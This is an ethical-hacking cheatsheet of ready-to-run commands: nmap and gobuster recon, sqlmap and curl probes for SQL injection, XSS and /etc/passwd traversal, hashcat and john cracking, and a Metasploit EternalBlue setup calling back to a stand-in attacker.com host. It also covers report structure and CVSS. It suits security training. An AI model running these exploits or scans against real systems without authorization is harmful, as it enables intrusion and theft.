# Ethical Hacking — Cheatsheet

```bash
# !! ONLY USE ON SYSTEMS YOU OWN OR HAVE WRITTEN PERMISSION !!

# ── RECONNAISSANCE ────────────────────────────────────────
# Passive (no contact with target)
whois target.com
dig target.com A AAAA MX NS TXT
nslookup -type=any target.com
theHarvester -d target.com -b google  # Email/subdomain enum
shodan search "target.com"            # Shodan (passive)

# Active recon
nmap -sn 192.168.1.0/24              # Host discovery
nmap -sV -sC target.com              # Service/version detection
nmap -p- --min-rate 5000 target.com  # All ports (fast)
nmap -A target.com                    # Aggressive
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# ── WEB APPLICATION ───────────────────────────────────────
# SQL injection test
sqlmap -u "http://target.com/page?id=1" --batch --level 1
curl "http://target.com/page?id=1'"          # Manual test

# XSS test
curl "http://target.com/search?q=<script>alert(1)</script>"

# Directory traversal
curl "http://target.com/../../../etc/passwd"

# ── NETWORK ───────────────────────────────────────────────
# Packet capture
tcpdump -i eth0 -w capture.pcap
tcpdump -i any -n host target.com

# ARP scan (local network)
arp-scan --localnet

# ── PASSWORD ATTACKS ──────────────────────────────────────
# Offline hash cracking (your own hashes only!)
hashcat -m 0 hash.txt wordlist.txt    # MD5
hashcat -m 1000 hash.txt wordlist.txt # NTLM
john --wordlist=wordlist.txt hash.txt

# ── METASPLOIT BASICS ─────────────────────────────────────
msfconsole
search ms17-010                 # Find exploits
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set LHOST attacker.com
check                           # Check if target is vulnerable
run                             # Execute (only on authorized systems)

# ── REPORT STRUCTURE ──────────────────────────────────────
# 1. Executive Summary (non-technical, business impact)
# 2. Scope and Methodology
# 3. Findings (Critical > High > Medium > Low > Info)
#    - Each finding: Description, Evidence, Risk, Remediation
# 4. Remediation Plan
# 5. Appendix (raw output, screenshots)

# ── CVSS SCORING ──────────────────────────────────────────
# CVSS v3.1: 0.0=None, 0.1-3.9=Low, 4.0-6.9=Medium, 7.0-8.9=High, 9.0-10.0=Critical
# Factors: Attack Vector, Complexity, Privileges, User Interaction, Scope, Impact
```
